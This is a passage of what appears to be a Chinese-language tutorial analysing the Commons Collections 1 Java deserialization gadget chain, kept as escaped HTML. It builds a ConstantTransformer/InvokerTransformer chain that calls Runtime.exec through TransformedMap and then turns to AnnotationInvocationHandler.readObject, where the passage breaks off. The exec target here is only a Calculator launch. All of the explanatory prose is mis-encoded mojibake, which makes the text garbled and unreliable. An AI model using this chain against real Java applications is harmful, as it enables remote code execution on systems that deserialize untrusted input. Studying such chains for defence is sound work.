&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;ConstantTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;constantToReturn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kd&#34;&gt;super&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;iConstant&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;constantToReturn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/**
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;     * Transforms the input by ignoring it and returning the stored constant instead.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;     * 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;     * @param input  the input object which is ignored
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;     * @return the stored constant
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;     */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;transform&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iConstant&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ¥ç€åˆ°ChainedTransformerç±»ï¼Œæ¥æ”¶çš„å‚æ•°æ˜¯Transformeræ•°ç»„ç±»å‹ï¼Œç„¶åå°†æ•°ç»„èµ‹å€¼ç»™iTransformerså˜é‡ã€‚å®ƒå°±ä¼šå°†ä¼ å…¥çš„iTransformerså¯¹è±¡è¿›è¡Œéå†å’Œè§¦å‘transformæ–¹æ³•ï¼Œç„¶åè¿”å›Objectç»™ä¸‹ä¸€ä¸ªtransformæ–¹æ³•è¿™æ ·å°±å®Œæˆäº†æŠŠå¤šä¸ªtransformerè¿æ¥æˆä¸€æ¡é“¾ï¼Œå¯¹ä¸€ä¸ªå¯¹è±¡ä¾æ¬¡é€šè¿‡é“¾æ¡å†…çš„æ¯ä¸€ä¸ªtransformerè¿›è¡Œè½¬æ¢ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;ChainedTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Transformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;transformers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kd&#34;&gt;super&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;iTransformers&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;transformers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/**
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;     * Transforms the input to result via each decorated transformer
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;     * 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;     * @param object  the input object passed to the first transformer
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;     * @return the transformed result
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;     */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;transform&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iTransformers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;object&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iTransformers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;].&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;transform&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é‚£æœ‰ä»€ä¹ˆç”¨ï¼Œçœ‹èµ·æ¥ç°åœ¨æ„Ÿè§‰æœ‰ç‚¹ä¹±çš„æ ·å­ï¼Œä¸æ€¥ï¼Œæˆ‘ä»¬å…ˆæŠŠä»£ç å†™å‡ºæ¥ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æŠŠRuntimeå¯¹è±¡æ”¾è¿›ConstantTransformerå¯¹è±¡é‡Œé¢ï¼Œç„¶åä½¿ç”¨ChainedTransformerè¿›è¡Œéå†æ•´ä¸ªTransformeræ•°ç»„ï¼Œä¾æ¬¡æ‰§è¡Œé‡Œé¢çš„transformæ–¹æ³•ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Transformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;transformers&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Transformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ConstantTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Runtime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getRuntime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;InvokerTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;exec&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ChainedTransformer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;chainedTransformer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ChainedTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;transformers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;innerMap&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HashMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;innerMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;put&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;111&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;outerMap&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;TransformedMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;decorate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;innerMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;chainedTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Entry&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;memberValue&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;outerMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;entrySet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;memberValue&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;setValue&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//ä¸Šé¢è¿˜å¯ä»¥å†™æˆè¿™æ ·ï¼ŒouterMapåä¸€ä¸²ä¸œè¥¿ï¼Œå…¶å®å°±æ˜¯è·å–è¿™ä¸ªmapçš„ç¬¬ä¸€ä¸ªé”®å€¼å¯¹ï¼ˆvalue,valueï¼‰ï¼›ç„¶åè½¬åŒ–æˆMap.Entryå½¢å¼ï¼Œè¿™æ˜¯mapçš„é”®å€¼å¯¹æ•°æ®æ ¼å¼
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//outerMap.entrySet().iterator().next().setValue(&amp;#34;test&amp;#34;);
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨è¿™é‡Œè¿˜å¯ä»¥æƒ³åˆ°ä¸€ä¸ªå¾ˆå·§å¦™çš„åœ°æ–¹å°±æ˜¯ChainedTransformerçš„transformæ–¹æ³•å¯ä»¥å…ˆæŠŠç¬¬ä¸€ä¸ªConstantTransformerå¤„ç†è¿‡çš„Runtimeå¯¹è±¡èµ‹å€¼ç»™ä¸‹ä¸€ä¸ªtransformæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯InvokerTransformerå¯¹è±¡ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iTransformers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;object&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iTransformers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;].&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;transform&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬æŠŠä¸Šé¢çš„setValueä¸²è”èµ·æ¥é‚£å°±æ˜¯æˆ‘ä»¬ä¸€å¼€å§‹è¿™å¼ å›¾çš„è¿‡ç¨‹ä¸€æ ·ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/commonscollections1_chain_analysis/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç°åœ¨æˆ‘ä»¬å°±å¯ä»¥æ­£å¼å»ä»AnnotationInvocationHandlerçš„readObjectå…¥å£ç‚¹è¿›è¡Œååºåˆ—åŒ–äº†ï¼Œå› ä¸ºAnnotationInvocationHandlerçš„æ„é€ æ–¹æ³•æ²¡æœ‰publicï¼Œæ‰€ä»¥è¦ä½¿ç”¨åå°„çš„æ–¹å¼è¿›è¡Œã€‚è€Œä¸”è¿˜è¦çœ‹ä¼ å…¥çš„å‚æ•°ï¼ŒmemberValuesæˆ‘ä»¬å·²ç»çŸ¥é“äº†ï¼Œå°±æ˜¯æŠŠouterMapå˜é‡æ”¾è¿›æ¥å³å¯ï¼Œç¬¬ä¸€å‚æ•°æ˜¯è¦ä¼ è¿›æ¥ä¸€ä¸ªæ³¨é‡Šç±»å‹çš„ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;AnnotationInvocationHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Annotation&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;memberValues&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&amp;gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;superInterfaces&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getInterfaces&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;isAnnotation&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;superInterfaces&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;
